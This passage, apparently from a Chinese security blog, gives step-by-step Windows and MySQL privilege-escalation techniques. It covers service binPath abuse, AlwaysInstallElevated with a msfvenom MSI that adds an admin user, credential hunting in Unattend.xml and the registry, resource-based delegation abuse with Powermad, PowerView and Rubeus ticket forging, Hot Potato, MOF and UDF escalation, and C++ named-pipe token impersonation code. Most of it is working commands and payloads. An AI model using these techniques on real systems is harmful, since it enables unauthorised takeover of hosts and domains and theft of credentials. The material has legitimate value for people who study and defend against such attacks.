的值为系统命令，然后重启服务时我们的系统命令会被执行。</p><p>对于后者，我们需要一款工具来快速揭示出我们能修改哪些服务的属性。<br>这个工具我们采用accesschk.exe，它是微软产出的，基本不会报毒。</p><p>我们通过该工具执行以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * &#x2F;accepteula</span><br><span class="line">or</span><br><span class="line">accesschk.exe -uwcqv &quot;Users&quot; * &#x2F;accepteula</span><br><span class="line">来查看Users组（根据实际情况来填哪个组）对哪些服务有哪些权限</span><br></pre></td></tr></table></figure><p>如果对某个服务有service_all_access或者以下权限，就说明能对其属性进行修改。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144124.png" alt="QQ截图20210217144124"></p><p>比如我们对Spooler服务有service_all_access权限，我们就可以这样做。<br>通过修改其binPath为恶意指令，然后等待管理员重启服务，我们的恶意指令就会被执行。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144141.png" alt="QQ截图20210217144141"></p><h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>如果windows启用了如下注册表项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”&#x3D;dword:00000001 </span><br><span class="line"></span><br><span class="line">[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]</span><br><span class="line">“AlwaysInstallElevated”&#x3D;dword:00000001</span><br></pre></td></tr></table></figure><p>那么所有msi（windows应用安装程序）都会以SYSTEM权限运行。此时如果我们执行一个恶意msi程序，即可达到提权目的<br>同时需要注意的一点是，这个注册表项不一定总是存在的。（比如我的实验机</p><p>我们可以通过reg query来验证这两条注册表项的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</span><br></pre></td></tr></table></figure><p>若均为1，我们就可以通过msfvenom生成恶意msi来提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;adduser USER&#x3D;rottenadmin PASS&#x3D;P@ssword123! -f msi -o rotten.msi</span><br></pre></td></tr></table></figure><p>然后执行，获得一个管理员账户。</p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p><em>Unattend.xml</em> <em>sysprep.xml和sysprep.inf文件</em><code>GPP.xml</code> 存在着一定信息泄露，他们通常存在于以下路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Panther\</span><br><span class="line">C:\Windows\Panther\Unattend\</span><br><span class="line">C:\Windows\System32\</span><br><span class="line">C:\Windows\System32\sysprep\</span><br></pre></td></tr></table></figure><p>找到后，找到 <em>Unattend.xml</em> 文件中的 <UserAccounts> 标签。就有可能找到用户的加密后的密码。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;UserAccounts&gt;</span><br><span class="line">    &lt;LocalAccounts&gt;</span><br><span class="line">        &lt;LocalAccount&gt;</span><br><span class="line">            &lt;Password&gt;</span><br><span class="line">                &lt;Value&gt;UEBzc3dvcmQxMjMhUGFzc3dvcmQ&#x3D;&lt;&#x2F;Value&gt; &#x2F;&#x2F;PASSWORD</span><br><span class="line">                &lt;PlainText&gt;false&lt;&#x2F;PlainText&gt;</span><br><span class="line">            &lt;&#x2F;Password&gt;</span><br><span class="line">            &lt;Description&gt;Local Administrator&lt;&#x2F;Description&gt;</span><br><span class="line">            &lt;DisplayName&gt;Administrator&lt;&#x2F;DisplayName&gt;</span><br><span class="line">            &lt;Group&gt;Administrators&lt;&#x2F;Group&gt;</span><br><span class="line">            &lt;Name&gt;Administrator&lt;&#x2F;Name&gt;</span><br><span class="line">        &lt;&#x2F;LocalAccount&gt;</span><br><span class="line">    &lt;&#x2F;LocalAccounts&gt;</span><br><span class="line">&lt;&#x2F;UserAccounts&gt;</span><br><span class="line">一些敏感文件查询指令</span><br><span class="line">C:\Users\user\Desktop&gt; dir C:\ &#x2F;s &#x2F;b &#x2F;c | findstr &#x2F;sr \*password\*</span><br><span class="line">reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br><span class="line">reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</span><br></pre></td></tr></table></figure><h2 id="基于资源的域委派攻击"><a href="#基于资源的域委派攻击" class="headerlink" title="基于资源的域委派攻击"></a>基于资源的域委派攻击</h2><p>refer:<a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p><h4 id="原理的几个点："><a href="#原理的几个点：" class="headerlink" title="原理的几个点："></a>原理的几个点：</h4><p>1.S4U2SELF 协议可以在用户没有配置 TrustedToAuthenticationForDelegation 属性（即开启使用任何协议认证的约束性委派）时被调用，但是返回的ST是不可被转发的。<br>2.基于资源的约束性委派主机 在被另一台主机委派访问时，在S4U2PROXY过程中提交过来的ST如果即使是不可转发的。KDC依旧会返回有效的ST2。<br>3.每个普通域用户默认可以创建至多十个机器账户（ 由MachineAccountQuota属性决定 ），每个机器账户被创建时都会自动注册SPN: <code>RestrictedKrbHost/domain</code>和<code>HOST/domain</code>这两个SPN</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程:"></a>攻击流程:</h4><p>假设开启基于资源的约束性委派机器为A<br>1.首先要有一个对当前计算机有写权限的账户，才能对A设置可以 被 委派访问的服务账户。<br>2.利用当前账户创建一个机器账户，并配置好机器账户到A的 基于资源的约束性委派<br>3.因为机器账户是我们创建的，我们知道他的密码账户，可以让它利用S4U2SELF协议获得一个不可转发ST。然后用这个不可转发ST通过S4U2PROXY，在基于资源的约束性委派基础上获得有效的访问A cifs服务的ST2。<br>4.用ST2访问A的CIFS服务，权限获得。</p><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>这个攻击说白了就是个提权…</p><p>首先我们检查一下域控是否是win2012以上的主机，因为只有这样才能开启 基于资源的约束性委派。</p><p>我们使用powersploit下的powerview脚本。执行命令 get-netdomaincontroller</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135833.png" alt="QQ截图20210217135833"></p><p>可以获得域控WIN版本</p><p>然后我们查看当前用户对哪台主机有写权限。因为是实验，所以我们先来看看怎么配置一个用户对一个机器的权限。<br>直接在域控上找到某主机，然后进入在属性里进入安全选项卡，添加某用户，然后给这个用户分配权限即可。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217135859.png" alt="QQ截图20210217135859"></p><p>我们依旧使用powerview。先调用<br><code>Get-DomainUser -Identity username -Properties objectsid</code>来获取当前用户SID<br>然后<code>Get-DomainObjectAcl -Identity 主机名 | ?&#123;$_.SecurityIdentifier -match &quot;刚刚得到的SID&quot;&#125;</code> 查看当前用户对某台主机是否有写权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140628.png" alt="QQ截图20210217140628"></p><p>如果有 GenericAll（完全控制权），GenericWrite、WriteProperty、WriteDacl 这些属性，就说明该用户能修改计算机的账户属性。<br>如图看到我们对WIN7进行操作</p><p>好的，我们接下来就要创立一个机器用户了。根据网上搜索结果，使用powermad这个ps脚本可以很快捷的创建一个机器用户。<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1New-MachineAccount -MachineAccount hacksystem -Password $(ConvertTo-SecureString &quot;hack&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140659.png" alt="QQ截图20210217140659"></p><p>好的，我们添加了一个密码hack，名为hacksystem的机器账户，接下来就是配置hacksystem到WIN7的委派了。我们需要做的，是修改WIN7的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性的值 ，这个操作我们用powerview实现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)&quot;  </span><br><span class="line">#这儿的sid是我们创建的#机器用户#evilsystem的sid</span><br><span class="line">$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WIN7| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140726.png" alt="QQ截图20210217140726"></p><p>至于机器账户SID怎么获得，powerview下的 <code>get-domiancomputer hacksystem</code><br>然后使用<code>Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity</code> 查看委派是否设置成功</p><p><code>Set-DomainObject win7 -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose </code>此命令可以清除 msds-allowedtoactonbehalfofotheridentity属性的值</p><p>现在都统统设置好了，开始下一步吧。<br>网上一般用的rubeus，这里我用kekeo吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:xxx &#x2F;password:xxx &#x2F;domain:xxx</span><br></pre></td></tr></table></figure><p>本地运算出机器用户ntlm hash 这里借用一下别人的图</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140944.png" alt="QQ截图20210217140944"></p><p><code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code> 写入票据</p><p>然后我在本机使用以上方法后klist一下，发现确实存在票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217140737.png" alt="QQ截图20210217140737"></p><p>但是dir \test1\c$时本机莫名其妙不能进行kerberos验证，我服了》。。但不管怎样，我们拿到银票了</p><h4 id="敏感用户不可委派的绕过"><a href="#敏感用户不可委派的绕过" class="headerlink" title="敏感用户不可委派的绕过"></a>敏感用户不可委派的绕过</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141050.png" alt="QQ截图20210217141050"></p><p>若我们的administrator用户被设置为敏感用户不可委派或者被加入保护组，按理说他的访问就不能进行委派。</p><p>我们在以administrator账户身份进行S4U时，只能进行S4U2SELF，不能进行S4U2PROXY。我们用 <code>Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/dm2008 /ptt</code>继续实验administrator，发现确实是这样</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141131.png" alt="QQ截图20210217141131"></p><p>此时我们用 rubeus.exe describe /ticker:S4Ubase64加密的票据</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141313.png" alt="QQ截图20210217141313"></p><p>可以发现servicename并没有指定某个服务，仅仅只有一个账户.即发生了服务名称缺失的问题。很简单，把票据修改一下就行了.网上很多说用这个工具<br><a href="https://www.pkisolutions.com/tools/asn1editor/">https://www.pkisolutions.com/tools/asn1editor/</a><br>但实际上rubeus也能完成票据修改<code>rubeus.exe tgssub /ticket:xxx /altservice:cifs/test1 /ptt</code></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141325.png" alt="QQ截图20210217141325"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141339.png" alt="QQ截图20210217141339"></p><p>完事</p><h2 id="POTATO-家族"><a href="#POTATO-家族" class="headerlink" title="POTATO 家族"></a>POTATO 家族</h2><h3 id="hot-potato"><a href="#hot-potato" class="headerlink" title="hot potato"></a>hot potato</h3><p>热土豆提权。很早前就听说过了，但一直没去了解过。前置知识是ntlm relay,可以去了解了解。 potato家族有很多，hot potato只是其中一种提权方式。<br>我环境有问题，不能很好的复现🙃，抓包分析啥的先咕咕吧。</p><p><a href="https://github.com/foxglovesec/Potato%F0%9F%91%88%E5%B7%A5%E5%85%B7">https://github.com/foxglovesec/Potato👈工具</a><br><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/">https://foxglovesecurity.com/2016/01/16/hot-potato/</a> 👈HOT POTATO技术文档，国内基本上翻译这个来的。</p><p>提权步骤大概是这个流程<br>1.本地nbns服务欺骗<br>2.wpad劫持<br>3.HTTP-&gt;SMB 的 ntlm relay</p><p>1.本地nbns服务欺骗</p><p>Windows域名解析规则是<br>本地HOST文件-》dns查询-》NBNS或者LLMNR查询<br>一旦本地发出NBNS查询，我们本地就可以迅速响应，啪的一下就响应了，很快啊，本地发包很快，只要发出NBNS包基本上都能被我们本地发包响应。<br>但是以上步骤还是有一些细节的：我们当前并非管理员权限，大几率是无法嗅探本地流量的,如果我们能够事先知道目标主机期望NBNS查询获得的主机名，我们可以伪造一个响应，对发送NBNS查询的那个主机快速的大量发送NBNS响应 .但是nbns流量包还有个叫特征码的东西，请求包和响应包的特征码必须相同，所以我们被迫发送65536个包爆破这个特征码——本地发包速度很快，本地NBNS欺骗成功率基本上在100%。</p><p>2.WPAD劫持</p><p>NBNS欺骗后我们就可以劫持WPAD的域名，把自己伪造称WPAD并返回自定义的PAC文件。意味着我们可以把本地发出的所有流量重定向。</p><p>3.RELAY</p><p>在现在这个年代，SMB-&gt;SMB的relay很少用到了，微软 禁用了同协议的NTLM认证 ，成功率很低。<br>但是HTTP-&gt;SMB的relay还是有的。HOT POTATO就是利用的这一点。<br>我们可以把主机发出的HTTP请求重定向到我们自定义的网页A，而网页A需要NTLM认证，我们就可以进行HTTP-&gt;SMB的relay’了。当HTTP请求来自于高权限的账户时，例如是来自windows 更新服务的请求，命令就会以”NT AUTHORITY\SYSTEM”权限运行。</p><p>HOT POTATO 根据Windows版本的不同，需要等待高权限用户NTLM认证来到的时间也不同。一般来说，<br>WIN7是瞬间就可以提权的<br>Windows Server 2012 R2,Windows Server 2012,Windows 8.1,Windows 8有一个自动更新机制，会每天下载证书信任列表(CTLs)<br>,etc</p><h2 id="MYSQL下的提权技术"><a href="#MYSQL下的提权技术" class="headerlink" title="MYSQL下的提权技术"></a>MYSQL下的提权技术</h2><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><p>在c:/windows/system32/wbem/mof/目录下的nullevt.mof每分钟都会有一个特定的时间去执行一次（由”And TargetInstance.Second = 5″;控制，这里输入5就是每分钟的第五秒执行。 那么把cmd命令添加到nullevt.mof中，cmd命令就会自动执行了。</p><p>前提是我们要能进入数据库进行操作，且mysql数据库的权限尽可能高才更有利。同时secure-file-priv 要为空（ mysql 5.6.34版本以后 secure_file_priv的值默认为NULL,禁止所有文件导入导出功能）</p><p>我们伪造的MOF文件格式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace &#x3D; &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  &#x3D; &quot;filtP2&quot;; </span><br><span class="line">    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second &#x3D; 5&quot;; </span><br><span class="line">    QueryLanguage &#x3D; &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name &#x3D; &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine &#x3D; &quot;JScript&quot;; </span><br><span class="line">    ScriptText &#x3D; </span><br><span class="line">    &quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin &#x2F;add\&quot;)&quot;;   &#x2F;&#x2F;修改此处即可</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   &#x3D; $Consumer; </span><br><span class="line">    Filter &#x3D; $EventFilter; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p>修改上面的cmd部分即可实现以管理员身份执行各种命令。<br>然后我们使用mysql下的命令 ，将mof覆盖过去。<br>待我们的命令被执行后，即代表提权成功。<br>Windows 2003似乎成功率蛮高的，WIN7试了试没反应。。。</p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>（这个也可以linux提权</p><p>udf，即自定义函数（user define function）</p><p>MYSQL可以自定义函数的。自定义函数在Windows下是以DLL文件存在于MYSQL的插件文件夹里面的（linux则是以os的形式）。我们可以自定义一个恶意dll，里面存放着可以执行系统命令的 函数。然后交给mysql以数据库权限执行。</p><p>前提：我们能操作数据库，且数据库权限必须很高（我们用这个方法提权到的权限就是数据库的权限</p><p>那么这个dll文件哪里来呢。sqlmap和msf都有。sqlmap下的 sqlmap/data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ 就是这个dll文件的编码版本。我们使用sqlmap下的sqlmap/extra/cloak/cloak.py对其进行解码获得dll文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .&#x2F;cloak.py -d -i .&#x2F;lib_mysqludf_sys.dll_  即可获得dll文件</span><br></pre></td></tr></table></figure><p>然后我们把dll文件放入mysql的插件文件夹，命名为udf.dll。插件文件夹可以通过命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;获得  （&#x2F;lib&#x2F;plugin文件夹需要自己创建）</span><br></pre></td></tr></table></figure><p>至于怎么把dll放入插件文件夹</p><p>1.直接粘贴复制 （权限可能不够<br>2.使用命令 select load_file(‘udf.dll’) into dumpfile “PLUGIN的路径”;(需要secure_file_priv为空</p><p>总之，如果把udf.dll放入plugin文件夹后，我们就可以执行以下操作提权了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create funtion sys_eval returns string soname &quot;udf.dll&quot;;</span><br><span class="line">select sys_eval(&#39;cmd&#39;);</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144509.png" alt="QQ截图20210217144509"></p><h3 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h3><p>说白了，就是通过mysql的高权限，向windows开机启动项文件夹里放入恶意vbs或者bat脚本,机器重启后自动执行。怎么让机器重启？等管理员或者 一些可导致服务器蓝屏的EXP<br>启动项路径一般为：<br>C:\Documents and Settings\All Users\「开始」菜单\程序\启动<br>C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;xxx&quot;) into dumpfile &quot;xxxx&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217144534.png" alt="QQ截图20210217144534"></p><p>没什么好说的</p><h2 id="命名管道提权"><a href="#命名管道提权" class="headerlink" title="命名管道提权"></a>命名管道提权</h2><p>提权方式为 令牌模仿。 Token Impersonation .</p><p>meterpreter的getsystem的提取方法之一就是这个方法</p><p>提权过程为从administrator用户提到SYSTEM权限。从普通用户提权到admin及以上权限是不可取的，因为普通用户创建的命名管道没有 <code>SeImpersonatePrivilege</code>，在复制令牌时会出现1346错误。</p><p>该方法技术细节为：以管理员权限创建一个命名管道，再通过创建SYSTEM权限服务，让服务连上命名管道，随后我们通过模拟客户端，获得SYSTEM权限的令牌，随后将其复制，再用复制后的令牌创建新进程（如CMD)，新进程的权限即SYSTEM权限。</p><p>这里贴上实现代码.<br>首先是被创建的服务的实现代码，该服务启动后会不断向服务器命名管道建立链接<br>生成好后，是Service.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">SERVICE_STATUS m_ServiceStatus;</span><br><span class="line">SERVICE_STATUS_HANDLE m_ServiceStatusHandle;</span><br><span class="line">BOOL bRunning;</span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);</span><br><span class="line">void WINAPI HandlerFunc(DWORD code);</span><br><span class="line">int main() &#123;</span><br><span class="line">WCHAR Servicename[] &#x3D; L&quot;ServiceA&quot;;</span><br><span class="line">SERVICE_TABLE_ENTRY Table[] &#x3D; &#123; &#123;Servicename,ServiceMain&#125;,&#123;NULL,NULL&#125; &#125;;</span><br><span class="line">StartServiceCtrlDispatcher(Table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m_ServiceStatus.dwServiceType &#x3D; SERVICE_WIN32_OWN_PROCESS;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_START_PENDING;</span><br><span class="line">m_ServiceStatus.dwControlsAccepted &#x3D; SERVICE_ACCEPT_STOP;</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwServiceSpecificExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">m_ServiceStatusHandle &#x3D; RegisterServiceCtrlHandler(L&quot;ServiceA&quot;, HandlerFunc);</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; true;</span><br><span class="line">while (bRunning) &#123;</span><br><span class="line">LPCWSTR PipeName &#x3D; L&quot;\\\\.\\pipe\\testpipe&quot;;</span><br><span class="line">HANDLE PipeHandle&#x3D;NULL;</span><br><span class="line">BOOL PipeInstance;</span><br><span class="line">WCHAR message[512] &#x3D; &#123; 0 &#125;;</span><br><span class="line">DWORD bytesWritten &#x3D; 0;</span><br><span class="line">BOOL Flag &#x3D; true;</span><br><span class="line">wchar_t message2[] &#x3D; L&quot;HELL&quot;;</span><br><span class="line">DWORD messageLength &#x3D; lstrlen(message2) * 2;</span><br><span class="line">do &#123;</span><br><span class="line">PipeHandle &#x3D; CreateFile(PipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class="line">&#125; while (PipeHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE);</span><br><span class="line"></span><br><span class="line">WriteFile(PipeHandle, &amp;message2, messageLength, &amp;bytesWritten, NULL);</span><br><span class="line"></span><br><span class="line">Flag &#x3D; ReadFile(PipeHandle, &amp;message, 512, &amp;bytesWritten, NULL);</span><br><span class="line">std::cout &lt;&lt; &quot;Message:&quot; &lt;&lt; message &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void WINAPI HandlerFunc(DWORD code) &#123;</span><br><span class="line">switch (code) &#123;</span><br><span class="line">case SERVICE_CONTROL_PAUSE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_PAUSED;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_CONTINUE:</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_RUNNING;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_STOP:</span><br><span class="line">m_ServiceStatus.dwWin32ExitCode &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwCurrentState &#x3D; SERVICE_STOPPED;</span><br><span class="line">m_ServiceStatus.dwCheckPoint &#x3D; 0;</span><br><span class="line">m_ServiceStatus.dwWaitHint &#x3D; 0;</span><br><span class="line"></span><br><span class="line">SetServiceStatus(m_ServiceStatusHandle, &amp;m_ServiceStatus);</span><br><span class="line">bRunning &#x3D; false;</span><br><span class="line">break;</span><br><span class="line">case SERVICE_CONTROL_INTERROGATE:</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是主体，命名管道服务器。生成后是Server.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 